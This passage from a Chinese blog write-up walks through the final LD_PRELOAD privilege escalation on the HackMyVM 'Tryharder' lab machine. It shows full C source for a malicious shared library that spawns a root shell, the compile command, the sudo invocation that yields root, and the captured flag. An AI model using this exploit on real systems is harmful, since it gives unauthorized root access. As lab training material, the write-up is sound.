superxiix\n</code></pre>\n<p>直接 <code>sudo</code> ，<code>root</code>权限执行<code>whoami</code>…</p>\n<pre><code class=\"hljs language-bash\">xiix@Tryharder:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> xiix: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> xiix on tryharder:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=LD_PRELOAD\n\nUser xiix may run the following commands on tryharder:\n    (ALL : ALL) /bin/whoami\n\n</code></pre>\n<pre><code class=\"hljs language-bash\">xiix@Tryharder:~$ <span class=\"hljs-built_in\">sudo</span> <span class=\"hljs-built_in\">whoami</span>\nroot\n</code></pre>\n<p>将它喂给<code>GPT</code>：</p>\n<blockquote>\n<p>虽然你不能直接 <code>sudo chmod</code> 或提权运行其他命令，但你有这个：</p>\n<pre><code class=\"hljs language-bash\">env_keep+=LD_PRELOAD\n</code></pre>\n<p>这在某些环境中，可能会带来 <strong>突破口</strong>！</p>\n</blockquote>\n<ul>\n<li><code>LD_PRELOAD</code> 可以在运行程序前强行加载你自定义的 <code>.so</code> 共享库。</li>\n<li>如果这个库中实现了 <code>getuid()</code> 或其他标准函数，它就可以被优先加载、覆盖。</li>\n<li>当你以 <code>sudo</code> 运行 <code>/bin/whoami</code>，就会先加载你的库，执行你指定的恶意代码！</li>\n</ul>\n<blockquote>\n<p><a href=\"https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path\">https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload---ld_library_path</a></p>\n</blockquote>\n<p>Save as <strong>/tmp/pe.c</strong></p>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;stdio.h></span>#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;sys/types.h></span>#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&#x3C;stdlib.h></span>void _init() {</span>\n    unsetenv(<span class=\"hljs-string\">\"LD_PRELOAD\"</span>);\n    setgid(<span class=\"hljs-number\">0</span>);\n    setuid(<span class=\"hljs-number\">0</span>);\n    system(<span class=\"hljs-string\">\"/bin/bash\"</span>);\n}\n</code></pre>\n<p>Then <strong>compile it</strong> using:</p>\n<pre><code class=\"hljs language-bash\">\n<span class=\"hljs-built_in\">cd</span> /tmp\ngcc -fPIC -shared -o pe.so pe.c -nostartfiles\n</code></pre>\n<p>Finally, <strong>escalate privileges</strong> running</p>\n<pre><code class=\"hljs language-bash\">sudoLD_PRELOAD=./pe.so &#x3C;COMMAND> <span class=\"hljs-comment\">#Use any command you can run with sudo</span>\n</code></pre>\n<p>这样就能获得<code>root</code>权限了</p>\n<pre><code class=\"hljs language-bash\">xiix@Tryharder:~$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles\npe.c: In <span class=\"hljs-keyword\">function</span> ‘_init’:\npe.c:7:5: warning: implicit declaration of <span class=\"hljs-keyword\">function</span> ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]\n     setgid(0);\n     ^~~~~~\n     setenv\npe.c:8:5: warning: implicit declaration of <span class=\"hljs-keyword\">function</span> ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]\n     setuid(0);\n     ^~~~~~\n     setenv\nxiix@Tryharder:~$ <span class=\"hljs-built_in\">sudo</span> LD_PRELOAD=./pe.so /bin/whoami\nroot@Tryharder:/home/xiix# \n</code></pre>\n<p>读取<code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">\nroot@Tryharder:~# <span class=\"hljs-built_in\">cat</span> congrats.txt \n        ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  _  \n       /    \\/    \\/    \\/    \\/    \\/    \\/    \\/    \\/    \\/    \\/ \\ \n      /_______________________________________________________________\\\n      |                                                               |\n      |  *** CONGRATULATIONS! YOU<span class=\"hljs-string\">'VE CONQUERED THE TARGET RANGE! ***  |\n      |_______________________________________________________________|\n\n   YOU ARE A TRUE HACKER LEGEND!\n   The Xiixhu Tech bows to your skills!\n\n   What'</span>s Next?\n   - Join our elite crew!\n   - QQ Group: 660930334\n   - Welcome aboard, mastermind!\n\n   Try Harder!\n   Keep hacking, keep winning!\n\n   [ Tip: Root password is hidden <span class=\"hljs-keyword\">in</span> the congrats message! Dig deeper! ]\nroot@Tryharder:~# <span class=\"hljs-built_in\">cat</span> root.txt \nFlag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}\n</code></pre>","title":"HackMyVM - Tryharder","date":"2025-04-12","updated":"2025-04-12","comments":true,"tags":["HackMyVM","Linux靶机","LD提权"],"categories":"靶机","description":"Tryharder.\n\n https://hackmyvm.eu/machines/machine.php?vm=Tryharder\n \n\nNotes：Hello Hacker! Try Harder!\n\n前期踩点\n\n\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n访问 HTTP，一个静态页面，什么内容都没有\n\n\n\n目录扫描无结果\n\n\n\n查看一下页面源码，找到如下信息\n\n\n\n\n\n访问 74221`\n\n..."},"recentPosts":[{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"}]},"__N_SSG":true}